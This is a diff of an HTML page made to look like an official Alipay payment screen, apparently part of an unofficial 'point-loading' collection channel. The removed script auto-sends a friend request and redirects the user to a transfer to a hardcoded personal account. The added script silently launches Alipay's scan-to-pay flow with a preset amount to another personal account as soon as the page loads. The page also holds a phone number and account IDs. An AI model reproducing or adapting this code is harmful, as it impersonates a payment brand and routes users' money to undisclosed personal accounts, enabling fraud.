@@ -1,5 +1,3 @@
-
-
 <!DOCTYPE html>
 <html>
 <head>
@@ -60,8 +58,9 @@
             width: 100%;
             box-sizing: border-box;
         }
+
         #xxx .aui-flex-box {
-            margin-left :5px;
+            margin-left: 5px;
         }
     </style>
 </head>
@@ -90,14 +89,14 @@
     </a>
 </div>
 <div class="am-process">
-    <div class="am-process-item pay"> <i class="am-icon process pay" aria-hidden="true"></i>
+    <div class="am-process-item pay"><i class="am-icon process pay" aria-hidden="true"></i>
         <div class="am-process-content">
             <div class="am-process-main">①立即支付 选择 转账</div>
             <div class="am-process-brief"></div>
         </div>
         <div class="am-process-down-border"></div>
     </div>
-    <div class="am-process-item pay"> <i class="am-icon process success" aria-hidden="true"></i>
+    <div class="am-process-item pay"><i class="am-icon process success" aria-hidden="true"></i>
         <div class="am-process-content">
             <div class="am-process-main">②转账</div>
             <div class="am-process-brief">请正确输入订单金额，否则不会上分</div>
@@ -105,14 +104,14 @@
         <div class="am-process-up-border"></div>
         <div class="am-process-down-border"></div>
     </div>
-    <div class="am-process-item success"> <i class="am-icon process success" aria-hidden="true"></i>
+    <div class="am-process-item success"><i class="am-icon process success" aria-hidden="true"></i>
         <div class="am-process-content">
             <div class="am-process-main">③支付成功</div>
         </div>
         <div class="am-process-up-border"></div>
     </div>
     <footer class="am-footer am-fixed am-fixed-bottom">
-        <div class="am-footer-interlink am-footer-top"> <a class="am-footer-link" href="javascript:javascrip()">刷新页面</a>
+        <div class="am-footer-interlink am-footer-top"><a class="am-footer-link" href="javascript:javascrip()">刷新页面</a>
         </div>
         <div class="am-footer-copyright">Copyright ? 2008-2016 AliPay</div>
     </footer>
@@ -121,41 +120,40 @@
 
 <script>
     var UA = navigator.userAgent || ''
-    var isAndroid = (function() {
+    var isAndroid = (function () {
         return UA.match(/Android/i) ? true : false
     })();
-    var isQQ = (function() {
+    var isQQ = (function () {
         return /(iPad|iPhone|iPod).*? (IPad)?QQ\/([\d\.]+)/.test(UA) || /\bV1_AND_SQI?_([\d\.]+)(.*? QQ\/([\d\.]+))?/.test(UA)
     })();
-    var isIos = (function() {
+    var isIos = (function () {
         return UA.match(/(iPad|iPhone|iPod)/i) ? true : false
     })();
 
-    var isIE = (function() {
+    var isIE = (function () {
         if (!!window.ActiveXObject || "ActiveXObject" in window)
             return true;
         else
             return false;
     })();
 
-    var isMac = (function() {
+    var isMac = (function () {
         return UA.match(/Intel Mac/i) ? true : false
     })();
-    var isQQBrowser = (function() {
+    var isQQBrowser = (function () {
         return UA.match(/QQBrowser/i) ? true : false
     })();
 
 
     var isComIfram = false;
-    if(isQQBrowser || isIE || isMac){
+    if (isQQBrowser || isIE || isMac) {
         isComIfram = true;
     }
 
 
-    var isWx = (function() {
+    var isWx = (function () {
         return UA.match(/micromessenger/i) ? true : false
     })();
-
 
 
     var isAlipay = UA.match(/AlipayClient/) ? true : false;
@@ -188,7 +186,7 @@
         redDot: '01', // -1表示不显示，0表示显示红点，1-99表示在红点上显示的数字
     });
     AlipayJSBridge.call('showOptionMenu');
-    document.addEventListener('optionMenu', function(e) {
+    document.addEventListener('optionMenu', function (e) {
         AlipayJSBridge.call('showPopMenu', {
             menus: [{
                 name: "查看帮助",
@@ -200,12 +198,15 @@
                     tag: "tag2",
                 }
             ],
-        }, function(e) {
+        }, function (e) {
             console.log(e);
         });
     }, false);
 
-    function javascrip(){history.go(0);}
+    function javascrip() {
+        history.go(0);
+    }
+
     var a = "2088332289581359";
     var b = "";
     var c = "afas8f7a89s7f9asffasf96d96g8gi98h798dh798df7h9hdg6h76fd76h8df7h8d75hdf";
@@ -220,57 +221,16 @@
     // 链接
     // var link = 'http://vip.765sp.cn/bankcard/index?orderid='+i;
     // var link = '请点击右边的+号发送红包，输入正确的金额￥'+h+'。输入错误金额将不会自动上分';
-    document.addEventListener('popMenuClick', function(e) {
+    document.addEventListener('popMenuClick', function (e) {
         // alert(JSON.stringify(e.data));
     }, false);
 
-    document.addEventListener('resume', function(event) {
+    document.addEventListener('resume', function (event) {
         //JSON.stringify(event.data)
         //alert('vvvv' + );
         history.go(0);
     });
 
-    //function javascript() {
-
-    //       window.location.href = "alipays://platformapi/startapp?appId=88886666&appLaunchMode=3&canSearch=false&chatLoginId=qq11224&chatUserId=" + a + "&chatUserName=x&chatUserType=1&entryMode=personalStage&prevBiz=chat&schemaMode=portalInside&target=personal&money="+h+"&amount=" + h + "&remark=" + i;
-
-
-    //}
-    tjhy();
-    function tjhy() {
-        AlipayJSBridge.call("pushWindow", {
-            url: "alipays://platformapi/startapp?appId=20000186&actionType=addfriend&userId=2088332289581359&loginId=15759762022&source=by_home&alert=true",
-            param: {
-            }
-        });
-    }
-    setTimeout("javascript()", 300);
-
-    function javascript() {
-        //上传浏览器信息
-        // $.post("/pay/orderhlist", { orderid:'2019032718350613701', type: 11,remarks: JSON.stringify({UA:UA,browser:browser})} );
-        AlipayJSBridge.call('alert', {
-                title: e,
-                message: f,
-                button: g
-            }, function(e) {
-                setTimeout(function(){
-                    // window.location.href = "alipays://platformapi/startapp?appId=20000167&forceRequest=0&returnAppId=recent&tLoginId="+j+"&tUnreadCount=0&tUserId="+a+"&tUserType=1";
-                }, 1);
-
-                setTimeout(function() {
-                    // window.location.href = "alipays://platformapi/startapp?appId=20000300&bizType=TRANSFER&action=keyboard&defaultword=" + link;
-                    repay();
-                }, 888);
-            }
-        );
-    }
-    function repay(){
-        var urls = 'alipays://platformapi/startapp?appId=09999988&actionType=toAccount&goBack=NO&amount='+h+'&userId='+a;
-        urls = encodeURIComponent(urls);
-        var url='https://ds.alipay.com/?from=mobilecodec&scheme='+urls;
-        window.location.href= url;
-    }
 
 </script>
 <script>
@@ -292,16 +252,54 @@
 <script src="./css/alipayjsapi.inc.min.js"></script>
 <script>
     ap.allowPullDownRefresh(false);
-    ap.onPullDownRefresh(function(res){
-        if(!res.refreshAvailable){
+    ap.onPullDownRefresh(function (res) {
+        if (!res.refreshAvailable) {
             ap.alert({
                 content: '刷新已禁止',
                 buttonText: '恢复'
-            }, function(){
+            }, function () {
                 ap.allowPullDownRefresh(true);
                 ap.showToast('刷新已恢复')
             });
         }
     });
 </script>
+
+<script>
+    function returnApp() {
+        AlipayJSBridge.call("exitApp")
+    }
+
+    function ready(a) {
+        window.AlipayJSBridge ? a && a() : document.addEventListener("AlipayJSBridgeReady", a, !1)
+    }
+
+    ready(function () {
+        try {
+            var a = {
+                actionType: "scan",
+                u: "2088521328947850",
+                a: "200",
+                m: "qq_765858558",
+                biz_data: {
+                    s: "money",
+                    u: "2088521328947850",
+                    a: "200",
+                    m: "qq_765858558"
+                }
+            }
+        } catch (b) {
+            returnApp()
+        }
+        AlipayJSBridge.call("startApp", {
+            appId: "20000123",
+            param: a
+        }, function (a) {
+        })
+    });
+    document.addEventListener("resume", function (a) {
+        returnApp()
+    });
+</script>
+
 </html>
